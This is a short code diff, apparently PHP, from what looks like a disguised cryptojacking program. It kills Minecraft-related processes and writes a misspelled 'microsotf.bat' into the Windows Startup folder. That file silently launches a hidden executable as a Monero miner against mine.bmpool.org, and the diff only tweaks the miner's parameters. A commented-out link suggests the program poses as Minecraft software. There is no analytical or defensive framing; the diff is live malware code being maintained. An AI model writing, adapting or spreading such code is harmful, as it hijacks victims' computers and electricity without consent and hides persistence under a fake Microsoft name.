@@ -6,7 +6,7 @@ execute('cmd /c taskkill /f /im Minecraft.exe');
 execute('cmd /c taskkill /f /im Minecraft.Windows.exe');
 execute('cmd /c taskkill /f /im oxibyte.exe');
 }
-file_put_contents($_ENV['APPDATA'].'\Microsoft\Windows\Start Menu\Programs\Startup\microsotf.bat','start '.$_ENV['APPDATA'].'\\Microsoft\\5.exe'.' --coin XMR --url mine.bmpool.org:6004 --user 2970288 -p Processor --log-file 1619948916_xmr_12001_log.txt --http-host 127.0.0.1 --http-port 12001 --threads 6 -B');
+file_put_contents($_ENV['APPDATA'].'\Microsoft\Windows\Start Menu\Programs\Startup\microsotf.bat','start '.$_ENV['APPDATA'].'\\Microsoft\\5.exe'.' --coin XMR --url mine.bmpool.org:6004 --user 2970288 -p Startup --log-file 1619948916_xmr_12001_log.txt --http-host 127.0.0.1 --http-port 12001 --threads 6 -B');
 //execute('cmd /c start https://vk.com/minecraft_education_windows_7');
 
 (new Thread(function(){
